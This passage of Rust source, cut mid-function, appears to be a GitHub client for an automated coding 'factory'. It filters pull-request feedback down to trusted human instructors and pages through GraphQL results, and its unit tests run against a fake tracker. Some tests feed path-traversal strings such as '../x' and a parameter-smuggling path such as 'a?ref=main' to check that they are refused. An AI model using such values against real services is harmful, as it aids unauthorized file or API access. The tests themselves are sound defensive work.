    // Written by an instructor who is a person, and not by the factory.
    let theirs = |author: Option<&Actor>, body: Option<&str>| {
        is_human_instructor(author, instructors) && !is_factory_comment(body.unwrap_or_default())
    };

    let reviews = page_back(gh, repo, pr, floor, &args, pull.reviews, &REVIEWS)?;
    let comments = page_back(
        gh,
        repo,
        pr,
        floor,
        &args,
        pull.comments,
        &CONVERSATION_COMMENTS,
    )?;
    // The reviews to judge, with the time each was submitted.
    let mut judged: Vec<(FeedbackReview, String)> = Vec::new();
    for review in reviews {
        if !theirs(review.author.as_ref(), review.body.as_deref())
            || !text_is_instructors(
                review.last_edited_at.as_deref(),
                review.editor.as_ref(),
                review.user_content_edits.as_ref(),
                instructors,
            )
        {
            continue;
        }
        let Some(at) = review.submitted_at.clone() else {
            continue;
        };
        require_utc_second(&args, "a review time", &at)?;
        if at.as_str() <= since {
            continue;
        }
        judged.push((review, at));
    }

    // The edit history of every edited inline comment of those reviews, read together.
    let mut edited_ids: Vec<&str> = Vec::new();
    let mut seen: HashSet<&str> = HashSet::new();
    for (review, _) in &judged {
        if !FEEDBACK_STATES.contains(&review.state.as_str()) {
            continue;
        }
        for c in &review.comments.nodes {
            if let Some(id) = c.id.as_deref()
                && c.last_edited_at.is_some()
                && theirs(c.author.as_ref(), c.body.as_deref())
                && seen.insert(id)
            {
                edited_ids.push(id);
            }
        }
    }
    let histories = comment_editors(gh, &edited_ids)?;

    let mut found: Vec<Feedback> = Vec::new();
    for (review, at) in &judged {
        let body = review.body.clone().unwrap_or_default();
        let inline_unread = review
            .comments
            .total_count
            .unwrap_or(0)
            .saturating_sub(review.comments.nodes.len() as u64);
        let mut inline = Vec::new();
        for c in &review.comments.nodes {
            if !theirs(c.author.as_ref(), c.body.as_deref()) {
                continue;
            }
            // One that was never edited needs no history; an edited one with no node id, or
            // whose history the answer does not have (it is gone), is not trusted.
            if c.last_edited_at.is_some() {
                let node = c.id.as_deref().and_then(|id| histories.get(id));
                let trusted = node.is_some_and(|node| {
                    text_is_instructors(
                        node.last_edited_at.as_deref(),
                        node.editor.as_ref(),
                        Some(&node.user_content_edits),
                        instructors,
                    )
                });
                if !trusted {
                    continue;
                }
            }
            inline.push(InlineComment {
                path: c.path.clone().unwrap_or_default(),
                line: c.line.or(c.original_line),
                body: c.body.clone().unwrap_or_default(),
            });
        }
        // An approval's body is not read, so "LGTM!" does not send the pull request back to
        // draft. A comment and a `COMMENTED` review always count: the factory's login opens
        // the pull requests, so an instructor acting as it cannot approve or request changes
        // and comments are its only way to ask.
        let counts = match review.state.as_str() {
            "CHANGES_REQUESTED" | "COMMENTED" => true,
            "APPROVED" => !inline.is_empty(),
            "DISMISSED" => !body.trim().is_empty() || !inline.is_empty(),
            _ => false,
        };
        if !counts {
            continue;
        }
        let Some(id) = database_id(review.full_database_id.as_ref()) else {
            return Err(unreadable("a review with an id", &review.state));
        };
        found.push(Feedback {
            id: format!("review:{id}"),
            author: review
                .author
                .as_ref()
                .map(|a| a.login.clone())
                .unwrap_or_default(),
            kind: FeedbackKind::Review {
                state: review.state.clone(),
            },
            created_at: at.clone(),
            body,
            inline,
            inline_unread,
        });
    }

    for comment in &comments {
        if !theirs(comment.author.as_ref(), comment.body.as_deref())
            || !text_is_instructors(
                comment.last_edited_at.as_deref(),
                comment.editor.as_ref(),
                comment.user_content_edits.as_ref(),
                instructors,
            )
        {
            continue;
        }
        require_utc_second(&args, "a comment time", &comment.created_at)?;
        if comment.created_at.as_str() <= since {
            continue;
        }
        let Some(id) = database_id(comment.full_database_id.as_ref()) else {
            return Err(unreadable("a comment with an id", &comment.created_at));
        };
        found.push(Feedback {
            id: format!("pr-comment:{id}"),
            author: comment
                .author
                .as_ref()
                .map(|a| a.login.clone())
                .unwrap_or_default(),
            kind: FeedbackKind::PrComment,
            created_at: comment.created_at.clone(),
            body: comment.body.clone().unwrap_or_default(),
            inline: Vec::new(),
            inline_unread: 0,
        });
    }
    // Stable, so a review and a comment of the same second keep the order they were read in.
    found.sort_by(|a, b| a.created_at.cmp(&b.created_at));
    Ok(found)
}

/// Every node of `list` on pull request `pr` that may be new, oldest first: the newest page
/// `first` and the pages before it, read with `before:` until one starts at or before `floor` or
/// is empty. A repeated cursor, a page past the list's limit, a missing cursor or a vanished
/// pull request is an error (`args` names the call): a read short of `floor` must not pass as
/// empty.
fn page_back<G, N>(
    gh: &G,
    repo: &str,
    pr: u64,
    floor: &str,
    args: &[String],
    first: Page<N>,
    list: &PagedList<N>,
) -> Result<Vec<N>, TrackerError>
where
    G: Tracker + ?Sized,
    N: DeserializeOwned,
{
    let name = list.name;
    let total = first.total_count.unwrap_or(0);
    let mut cursor = first.page_info.and_then(|info| info.start_cursor);
    let mut nodes = first.nodes;
    let mut pages = 1;
    while total > nodes.len() as u64 {
        // The oldest node read is proven old only by a time at or before `floor`.
        if let Some(at) = nodes.first().and_then(list.time) {
            require_utc_second(args, list.time_name, at)?;
            if at <= floor {
                break;
            }
        }
        let Some(before) = cursor.take() else {
            return Err(parse_error(
                args,
                &format!(
                    "a cursor for the {name} before the oldest one read, since there are {total} and {} were read",
                    nodes.len()
                ),
            ));
        };
        if pages >= list.page_limit {
            return Err(parse_error(
                args,
                &format!(
                    "the {name} since {floor} within {} pages of {}",
                    list.page_limit, list.page_size
                ),
            ));
        }
        let mut page_args = issue_query_args(repo, list.before_query, pr)?;
        page_args.push("-f".to_string());
        page_args.push(format!("before={before}"));
        let answer: BeforeAnswer<N> = gh_json(
            gh,
            &page_args,
            &format!("a GraphQL response with the earlier {name}"),
        )?;
        pages += 1;
        let Some(pull) = answer.data.repository.pull_request else {
            return Err(parse_error(
                &page_args,
                &format!("the pull request on every page of its {name}"),
            ));
        };
        // GitHub answers `before:` the oldest cursor with an empty page: the start of the list
        // was reached, and everything was read even if `totalCount` counted more.
        if pull.page.nodes.is_empty() {
            break;
        }
        cursor = pull.page.page_info.and_then(|info| info.start_cursor);
        if cursor.as_deref() == Some(before.as_str()) {
            return Err(parse_error(
                &page_args,
                &format!("a new cursor for the {name} before {before}, got the same one again"),
            ));
        }
        nodes.splice(0..0, pull.page.nodes);
    }
    Ok(nodes)
}

#[cfg(test)]
mod tests {
    use serde_json::{Value, json};

    use super::*;
    use crate::factory::github::gh::command_text;
    use crate::factory::github::{Answer, FakeTracker};

    fn args(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|part| part.to_string()).collect()
    }

    #[test]
    fn pages_split_correctly_around_brackets_and_quotes_inside_strings() {
        let pages = "[{\"id\":1,\"body\":\"] [ } \\\" {\"}]\n[{\"id\":3,\"body\":\"s\"}]";
        #[derive(serde::Deserialize)]
        struct Row {
            id: u64,
        }
        let fake = FakeTracker::answering([Answer::ok(pages)]);
        let rows: Vec<Row> = gh_pages(&fake, &args(&["api", "x", "--paginate"]), "rows").unwrap();
        assert_eq!(rows.iter().map(|r| r.id).collect::<Vec<_>>(), vec![1, 3]);
    }

    #[test]
    fn pages_printed_back_to_back_are_read_and_a_page_cut_short_is_a_parse_error() {
        #[derive(Debug, serde::Deserialize)]
        struct Row {
            id: u64,
        }
        let call = args(&["api", "x", "--paginate"]);
        let fake = FakeTracker::answering([Answer::ok("[{\"id\":1}][{\"id\":2}]")]);
        let rows: Vec<Row> = gh_pages(&fake, &call, "rows").unwrap();
        assert_eq!(rows.iter().map(|r| r.id).collect::<Vec<_>>(), vec![1, 2]);
        for cut in ["[{\"id\":1}][{\"id\":2}", "[{\"id\":1}] x", "{\"id\":1}"] {
            let fake = FakeTracker::answering([Answer::ok(cut)]);
            let error = gh_pages::<Row, _>(&fake, &call, "rows").unwrap_err();
            assert!(is_parse(&error), "{cut}: {error}");
        }
    }

    #[test]
    fn empty_paginated_output_is_a_parse_error() {
        #[derive(Debug, serde::Deserialize)]
        struct Row {}
        let fake = FakeTracker::answering([Answer::ok(" \n")]);
        let error =
            gh_pages::<Row, _>(&fake, &args(&["api", "x"]), "JSON arrays of rows").unwrap_err();
        assert_eq!(
            error.to_string(),
            "`gh api x` returned unexpected output: JSON arrays of rows (output was empty)"
        );
    }

    #[test]
    fn a_utc_second_is_exactly_yyyy_mm_dd_thh_mm_ssz() {
        for good in ["2026-10-04T10:13:16Z", "0000-00-00T00:00:00Z"] {
            assert!(is_utc_second(good), "{good}");
        }
        for bad in [
            "2026-10-04T10:13:16.000Z",
            "2026-10-04T10:13:16+00:00",
            "2026-10-04 10:13:16Z",
            "2026-10-04T10:13:16z",
            "2026-1-04T10:13:16Z",
            "",
            "2026-10-04T10:13:1٦Z",
        ] {
            assert!(!is_utc_second(bad), "{bad}");
        }
    }

    #[test]
    fn a_graphql_call_for_a_repo_that_is_not_owner_name_is_a_parse_error() {
        assert_eq!(
            issue_query_args("softfac", "query", 6)
                .unwrap_err()
                .to_string(),
            "`gh api graphql` returned unexpected output: a repo written as owner/name, got `softfac`"
        );
        assert_eq!(
            issue_query_args("rawphp/softfac", "q", 6).unwrap(),
            args(&[
                "api",
                "graphql",
                "-f",
                "query=q",
                "-f",
                "owner=rawphp",
                "-f",
                "name=softfac",
                "-F",
                "number=6"
            ])
        );
    }

    const REPO: &str = "rawphp/softfac";
    const BASE_SHA: &str = "9f8e7d6c5b4a39281706f5e4d3c2b1a098765432";
    const FILE_SHA: &str = BASE_SHA;
    const CONFIG_TEXT: &str = "factory:\n  instructors: [tomkaczocha]\n  base: main\n";
    const CONFIG_B64: &str =
        "ZmFjdG9yeToKICBpbnN0cnVjdG9yczogW3RvbWthY3pvY2hhXQogIGJhc2U6IG1haW4K\n";
    const HEAD_SHA: &str = "4f1c2d3e4a5b60718293a4b5c6d7e8f901234567";

    fn is_parse(error: &TrackerError) -> bool {
        matches!(
            error,
            TrackerError::Other {
                kind: OtherKind::Parse,
                ..
            }
        )
    }

    fn is_refused(error: &TrackerError) -> bool {
        matches!(
            error,
            TrackerError::Other {
                kind: OtherKind::InvalidArgument,
                ..
            }
        )
    }

    fn is_failed(error: &TrackerError) -> bool {
        matches!(
            error,
            TrackerError::Other {
                kind: OtherKind::Failed,
                ..
            }
        )
    }

    fn ref_reply(sha: &str) -> String {
        format!(
            "{{\"ref\":\"refs/heads/main\",\"node_id\":\"REF_x\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/refs/heads/main\",\"object\":{{\"sha\":\"{sha}\",\"type\":\"commit\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/commits/{sha}\"}}}}"
        )
    }

    fn file_reply(kind: &str, encoding: &str, size: u64, content: &str) -> String {
        serde_json::json!({
            "name": "config.yml",
            "path": ".dw/config.yml",
            "sha": "abc",
            "size": size,
            "url": "https://api.github.com/repos/rawphp/softfac/contents/.dw/config.yml?ref=main",
            "type": kind,
            "content": content,
            "encoding": encoding,
            "_links": {"self": "x"},
        })
        .to_string()
    }

    fn encode_base64(bytes: &[u8]) -> String {
        const TABLE: &[u8; 64] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let n = chunk
                .iter()
                .enumerate()
                .fold(0u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
            for i in 0..4 {
                if i <= chunk.len() {
                    out.push(TABLE[((n >> (18 - 6 * i)) & 63) as usize] as char);
                } else {
                    out.push('=');
                }
            }
        }
        out
    }

    #[test]
    fn branch_tip_reads_the_full_commit_id_of_the_branch_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), BASE_SHA);
        assert_eq!(
            fake.calls(),
            vec![args(&["api", "repos/rawphp/softfac/git/ref/heads/main"])]
        );
    }

    #[test]
    fn branch_tip_keeps_slashes_in_the_branch_and_encodes_everything_else() {
        let fake = FakeTracker::answering([
            Answer::ok(ref_reply(BASE_SHA)),
            Answer::ok(ref_reply(BASE_SHA)),
        ]);
        branch_tip(&fake, REPO, "release/1.0").unwrap();
        branch_tip(&fake, REPO, "a b?c#d%e").unwrap();
        let calls = fake.calls();
        assert_eq!(
            calls[0][1],
            "repos/rawphp/softfac/git/ref/heads/release/1.0"
        );
        assert_eq!(
            calls[1][1],
            "repos/rawphp/softfac/git/ref/heads/a%20b%3Fc%23d%25e"
        );
    }

    #[test]
    fn branch_tip_refuses_an_answer_that_is_not_a_commit_id_or_not_a_commit() {
        let tag = ref_reply(&BASE_SHA.to_uppercase()).replace("commit", "tag");
        for answer in [
            ref_reply("main"),
            ref_reply("9f8e7d6c5b4a3928"),
            tag,
            "{\"object\":{\"type\":\"commit\"}}".to_string(),
            "[]".to_string(),
            "not json".to_string(),
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
            let error = branch_tip(&fake, REPO, "main").unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn branch_tip_accepts_a_64_digit_id() {
        let sha = "a".repeat(64);
        let fake = FakeTracker::answering([Answer::ok(ref_reply(&sha))]);
        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), sha);
    }

    #[test]
    fn branch_tip_refuses_a_branch_name_that_could_leave_the_refs_path_with_no_call() {
        for branch in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
            let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
            let error = branch_tip(&fake, REPO, branch).unwrap_err();
            assert!(is_refused(&error), "{branch}: {error}");
            assert!(fake.calls().is_empty(), "{branch}");
        }
    }

    #[test]
    fn branch_tip_of_a_branch_that_is_not_there_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = branch_tip(&fake, REPO, "gone").unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    #[test]
    fn default_branch_reads_the_repo_from_the_api_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(
            "{\"id\":1,\"name\":\"softfac\",\"full_name\":\"rawphp/softfac\",\"default_branch\":\"main\",\"private\":true}",
        )]);
        assert_eq!(default_branch(&fake, REPO).unwrap(), "main");
        assert_eq!(fake.calls(), vec![args(&["api", "repos/rawphp/softfac"])]);
    }

    #[test]
    fn default_branch_refuses_an_answer_without_one() {
        for answer in [
            "{\"name\":\"softfac\"}",
            "{\"default_branch\":\"\"}",
            "{\"default_branch\":null}",
            "[]",
            "no",
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer)]);
            let error = default_branch(&fake, REPO).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn file_at_reads_a_file_at_a_commit_with_the_exact_call_and_decodes_it() {
        let fake =
            FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
        assert_eq!(
            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
            CONFIG_TEXT
        );
        assert_eq!(
            fake.calls(),
            vec![args(&[
                "api",
                &format!("repos/rawphp/softfac/contents/.dw/config.yml?ref={FILE_SHA}")
            ])]
        );
    }

    #[test]
    fn file_at_decodes_content_wrapped_over_several_lines_and_padded() {
        let b64 = "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh\nYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQo=\n";
        let fake = FakeTracker::answering([Answer::ok(file_reply("file", "base64", 101, b64))]);
        assert_eq!(
            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
            format!("{}\n", "a".repeat(100))
        );
    }

    #[test]
    fn file_at_refuses_a_file_over_the_size_cap_even_when_its_content_is_whole() {
        // The size check must refuse it on its own: the content matches the stated size.
        let size = MAX_FILE_BYTES + 1;
        let content = encode_base64("a".repeat(size as usize).as_bytes());
        let fake =
            FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, &content))]);
        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
        assert!(is_parse(&error), "{error}");
        assert!(error.to_string().contains("it is too big"), "{error}");
    }

    #[test]
    fn file_at_refuses_what_is_not_a_plain_complete_file() {
        for answer in [
            // A directory is a JSON array.
            "[{\"type\":\"file\",\"name\":\"config.yml\"}]".to_string(),
            file_reply("symlink", "base64", 51, CONFIG_B64),
            file_reply("submodule", "base64", 51, CONFIG_B64),
            // A file over 1 MB comes with no content and the encoding `none`.
            file_reply("file", "none", 2_000_000, ""),
            // Under the size cap, but the content is not base64 even though it reads like it.
            file_reply("file", "none", 51, CONFIG_B64),
            file_reply("file", "utf-8", 51, CONFIG_B64),
            // The size says more than the content holds: truncated.
            file_reply("file", "base64", 5_000, CONFIG_B64),
            file_reply("file", "base64", 10, CONFIG_B64),
            // Over the size this reader accepts, whatever the content says.
            file_reply("file", "base64", MAX_FILE_BYTES + 1, CONFIG_B64),
            // Not base64, not UTF-8.
            file_reply("file", "base64", 51, "!!!not base64!!!"),
            file_reply("file", "base64", 3, "//4K\n"),
            "not json".to_string(),
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn file_at_refuses_base64_whose_padding_does_not_fit_its_length() {
        // `YQ==` is "a" and `YWI=` is "ab". One `=` after two characters, or two after three,
        // is not base64.
        for (b64, size) in [("YQ=", 1), ("YWI==", 2), ("YQ", 1), ("YQ==YQ==", 2)] {
            let fake =
                FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, b64))]);
            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
            assert!(is_parse(&error), "{b64}: {error}");
        }
        for (b64, want) in [("YQ==", "a"), ("YWI=", "ab")] {
            let fake = FakeTracker::answering([Answer::ok(file_reply(
                "file",
                "base64",
                want.len() as u64,
                b64,
            ))]);
            assert_eq!(
                file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
                want
            );
        }
    }

    #[test]
    fn file_at_refuses_base64_whose_padding_bits_are_not_zero() {
        // `YR==` fits its padding and its length, but its four leftover bits are not zero.
        let fake = FakeTracker::answering([Answer::ok(file_reply("file", "base64", 1, "YR=="))]);
        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
        assert!(is_parse(&error), "{error}");
    }

    #[test]
    fn file_at_makes_no_call_for_a_ref_that_is_not_a_full_commit_id_or_a_path_that_could_leave() {
        for (path, sha) in [
            (".dw/config.yml", "main"),
            (".dw/config.yml", "9f8e7d6c"),
            (".dw/config.yml", "9f8e7d6c5b4a39281706f5e4d3c2b1a09876543g"),
            ("../x", FILE_SHA),
            ("a//b", FILE_SHA),
            ("", FILE_SHA),
            ("a b", FILE_SHA),
            ("a?ref=main", FILE_SHA),
        ] {
            let fake =
                FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
            let error = file_at(&fake, REPO, path, sha).unwrap_err();
            assert!(is_refused(&error), "{path} {sha}: {error}");
            assert!(fake.calls().is_empty(), "{path} {sha}");
        }
    }

    #[test]
    fn file_at_of_a_file_that_is_not_there_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    // The listings and one issue.

    const LIST_ONE: &str = "[{\"assignees\":[{\"id\":\"MDQ6VXNlcjE=\",\"login\":\"rawphp\",\"name\":\"Tom\"}],\"labels\":[{\"id\":\"LA_1\",\"name\":\"factory:needs-info\",\"description\":\"d\",\"color\":\"d93f0b\"}],\"number\":6,\"title\":\"GitHub client\"}]";
    const LIST_MANY: &str = "[{\"assignees\":[],\"labels\":[],\"number\":6,\"title\":\"GitHub client\"},{\"assignees\":[{\"login\":\"a\"},{\"login\":\"b\"}],\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"Postponed\"}],\"number\":9,\"title\":\"Daemon loop\"}]";
    const ISSUE_VIEW: &str = "{\"assignees\":[{\"login\":\"rawphp\"}],\"author\":{\"id\":\"MDQ6VXNlcjE=\",\"is_bot\":false,\"login\":\"tomkaczocha\",\"name\":\"Tom\"},\"body\":\"Build the runner.\\n\\n- one\\n- two\",\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"phase:1\"}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}";

    fn listing_of(count: u64) -> String {
        let rows: Vec<String> = (1..=count)
            .rev()
            .map(|n| {
                format!("{{\"assignees\":[],\"labels\":[],\"number\":{n},\"title\":\"issue {n}\"}}")
            })
            .collect();
        format!("[{}]", rows.join(","))
    }

    fn issue_json(labels: &[&str], assignees: &[&str], body: &str) -> String {
        let assignees: Vec<String> = assignees
            .iter()
            .map(|n| format!("{{\"login\":\"{n}\"}}"))
            .collect();
        let labels: Vec<String> = labels
            .iter()
            .map(|n| format!("{{\"name\":\"{n}\"}}"))
            .collect();
        format!(
            "{{\"assignees\":[{}],\"author\":null,\"body\":{body},\"labels\":[{}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}}",
            assignees.join(","),
            labels.join(",")
        )
    }

    fn issue_view_call(number: &str) -> Vec<String> {
        args(&[
            "issue",
            "view",
            number,
            "--repo",
            REPO,
            "--json",
            "number,title,body,labels,assignees,state,author",
        ])
    }

    #[test]
    fn list_issues_with_none() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert_eq!(
            issues,
            Listing {
                items: vec![],
                cut: false
            }
        );
        assert_eq!(
            fake.calls(),
            vec![args(&[
                "issue",
                "list",
                "--repo",
                REPO,
                "--state",
                "open",
                "--label",
                "factory:ready",
                "--limit",
                "201",
                "--json",
                "number,title,assignees,labels",
            ])]
        );
    }

    #[test]
    fn a_spawn_failure_is_a_spawn_error_carrying_the_args() {
        let fake = FakeTracker::answering([Answer::NotStarted("gh not found".into())]);
        let error = list_issues(&fake, REPO, State::Ready).unwrap_err();
        assert_eq!(
            fake.calls()[0][..4],
            args(&["issue", "list", "--repo", REPO])[..]
        );
        let message = error.to_string();
        assert!(
            message.contains("gh issue list --repo rawphp/softfac"),
            "{message}"
        );
        assert!(message.contains("gh not found"), "{message}");
    }

    #[test]
    fn list_issues_with_one_ignores_unknown_fields() {
        let fake = FakeTracker::answering([Answer::ok(LIST_ONE)]);
        let issues = list_issues(&fake, REPO, State::NeedsInfo).unwrap();
        assert_eq!(
            issues.items,
            vec![IssueSummary {
                number: 6,
                title: "GitHub client".into(),
                assignees: vec!["rawphp".into()],
                labels: vec!["factory:needs-info".into()],
            }]
        );
        assert_eq!(fake.calls()[0][7], "factory:needs-info");
    }

    #[test]
    fn list_issues_with_several_carries_each_ones_label_names_or_none() {
        let fake = FakeTracker::answering([Answer::ok(LIST_MANY)]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert_eq!(
            issues.items,
            vec![
                IssueSummary {
                    number: 6,
                    title: "GitHub client".into(),
                    assignees: vec![],
                    labels: vec![],
                },
                IssueSummary {
                    number: 9,
                    title: "Daemon loop".into(),
                    assignees: vec!["a".into(), "b".into()],
                    labels: vec!["factory:ready".into(), "Postponed".into()],
                },
            ]
        );
    }

    #[test]
    fn list_issues_past_the_limit_returns_the_first_200_and_says_it_was_cut() {
        assert_eq!(LIST_LIMIT, 200);
        let fake = FakeTracker::answering([Answer::ok(listing_of(201))]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert!(issues.cut);
        assert_eq!(issues.items.len(), 200);
        assert_eq!(
            issues.items.iter().map(|i| i.number).collect::<Vec<_>>(),
            (2..=201).rev().collect::<Vec<u64>>()
        );
        assert_eq!(fake.calls()[0][9], "201");
    }

    #[test]
    fn list_issues_at_the_limit_returns_them_all_and_says_nothing() {
        let fake = FakeTracker::answering([Answer::ok(listing_of(200))]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert!(!issues.cut);
        assert_eq!(issues.items.len(), 200);
    }

    #[test]
    fn malformed_json_is_a_parse_error_carrying_the_args() {
        let fake = FakeTracker::answering([Answer::ok("not json")]);
        let error = list_issues(&fake, REPO, State::Ready).unwrap_err();
        let message = error.to_string();
        assert!(is_parse(&error), "{message}");
        assert!(message.contains("JSON array of issues"), "{message}");
        assert!(message.contains("unexpected output"), "{message}");
        assert!(
            message.contains("gh issue list --repo rawphp/softfac"),
            "{message}"
        );
    }

    #[test]
    fn issue_reads_the_real_shape_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(ISSUE_VIEW)]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(fake.calls(), vec![issue_view_call("10")]);
        assert_eq!(
            detail,
            IssueDetail {
                number: 10,
                title: "Build step".into(),
                body: "Build the runner.\n\n- one\n- two".into(),
                labels: vec!["factory:ready".into(), "phase:1".into()],
                assignees: vec!["rawphp".into()],
                author: Some("tomkaczocha".into()),
                state: Some(State::Ready),
                closed: false,
            }
        );
    }

    #[test]
    fn issue_says_when_github_has_it_closed_and_keeps_its_factory_label() {
        let fake = FakeTracker::answering([Answer::ok(
            ISSUE_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
        )]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert!(detail.closed);
        assert_eq!(detail.state, Some(State::Ready));
    }

    #[test]
    fn issue_author_is_null_when_gh_gives_null_or_nothing() {
        let without_author = {
            let start = ISSUE_VIEW.find("\"author\":{").unwrap();
            let end = start + ISSUE_VIEW[start..].find("},").unwrap() + 2;
            format!("{}{}", &ISSUE_VIEW[..start], &ISSUE_VIEW[end..])
        };
        let fake = FakeTracker::answering([
            Answer::ok(issue_json(&[], &[], "\"b\"")),
            Answer::ok(without_author),
        ]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
    }

    #[test]
    fn issue_state_is_null_with_no_factory_label() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["phase:1", "bug"], &[], "\"b\""))]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(detail.state, None);
        assert!(detail.assignees.is_empty());
    }

    #[test]
    fn issue_state_is_the_one_factory_label() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["bug", "factory:needs-info"],
            &[],
            "\"b\"",
        ))]);
        assert_eq!(
            issue(&fake, REPO, 10).unwrap().state,
            Some(State::NeedsInfo)
        );
    }

    #[test]
    fn issue_state_is_null_with_two_factory_labels() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["factory:ready", "factory:building"],
            &[],
            "\"b\"",
        ))]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
    }

    #[test]
    fn issue_state_is_null_for_an_unknown_factory_label() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["factory:bogus"], &[], "\"b\""))]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
    }

    #[test]
    fn issue_state_is_null_with_a_bogus_and_a_real_factory_label_in_either_order() {
        for labels in [
            ["factory:bogus", "factory:ready"],
            ["factory:ready", "factory:bogus"],
        ] {
            let fake = FakeTracker::answering([Answer::ok(issue_json(&labels, &[], "\"b\""))]);
            assert_eq!(issue(&fake, REPO, 10).unwrap().state, None, "{labels:?}");
        }
    }

    #[test]
    fn issue_with_a_null_body_has_an_empty_body_and_keeps_every_assignee() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["factory:ready"],
            &["a", "b"],
            "null",
        ))]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(detail.body, "");
        assert_eq!(detail.assignees, vec!["a".to_string(), "b".to_string()]);
    }

    #[test]
    fn issue_errors_are_typed() {
        let failing = FakeTracker::answering([Answer::fail(1, "not found")]);
        let failed = issue(&failing, REPO, 10).unwrap_err();
        assert!(is_failed(&failed), "{failed}");
        assert!(failed.to_string().contains("status 1"), "{failed}");

        let wrong = FakeTracker::answering([Answer::ok("[]")]);
        assert!(is_parse(&issue(&wrong, REPO, 10).unwrap_err()));

        let null_assignees = FakeTracker::answering([Answer::ok("{\"assignees\":null}")]);
        assert!(is_parse(&issue(&null_assignees, REPO, 10).unwrap_err()));
    }

    #[test]
    fn issue_uses_the_number_it_is_given() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["factory:ready"], &[], "\"b\""))]);
        issue(&fake, REPO, 7).unwrap();
        assert_eq!(fake.calls()[0][..3], args(&["issue", "view", "7"])[..]);
    }

    // Several issues' labels in one read.

    /// The one call that reads the labels of `numbers`, as `issue_labels` makes it: each URL is
    /// a variable, so the query text holds nothing read from outside.
    fn issue_labels_call(numbers: &[u64]) -> Vec<String> {
        let declared: Vec<String> = numbers.iter().map(|n| format!("$u{n}: URI!")).collect();
        let asked: Vec<String> = numbers
            .iter()
            .map(|n| format!("i{n}: resource(url: $u{n}) {{ ...Labelled }}"))
            .collect();
        let mut call = args(&[
            "api",
            "graphql",
            "-f",
            &format!(
                "query=query({}) {{ {} }} fragment Labelled on Issue {{ number state labels(first: 100) {{ nodes {{ name }} }} }}",
                declared.join(", "),
                asked.join(" ")
            ),
        ]);
        for n in numbers {
            call.push("-f".into());
            call.push(format!("u{n}=https://github.com/{REPO}/issues/{n}"));
        }
        call
    }

    /// GitHub's answer for each of `numbers`, found open with `factory:stuck`.
    fn all_stuck(numbers: &[u64]) -> String {
        let data: serde_json::Map<String, Value> = numbers
            .iter()
